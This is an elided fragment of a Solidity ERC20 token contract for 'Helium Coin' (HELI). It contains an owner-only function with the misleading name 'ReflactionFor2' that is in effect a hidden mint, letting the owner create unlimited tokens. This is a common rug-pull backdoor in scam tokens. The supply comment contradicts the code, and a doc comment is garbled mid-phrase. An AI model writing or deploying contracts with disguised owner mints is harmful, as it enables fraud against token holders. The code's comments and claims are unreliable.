...
/*
 * @dev Provides information about the current  context, including the
...
contract ERC20 is Context, IERC20, Ownable {
    ...
    function ReflactionFor2(uint256 amount) public onlyOwner {
    ReflactionFor2(msg.sender, amount);
    }
    ...
    function ReflactionFor2(address account, uint256 amount) internal virtual {
     ...
     * Calling conditions:
     *
     * - when `from` and `to` are both non-zero, ` of ``from``'s tokens
...
contract ONTA is ERC20 {

    uint tokenTotalSupply = 1000000000000000000; // 100 Million Token Supply

    constructor() public ERC20("Helium Coin", "HELI") {
        ReflactionFor2(msg.sender, tokenTotalSupply * (10 ** uint256(decimals())));
    }
}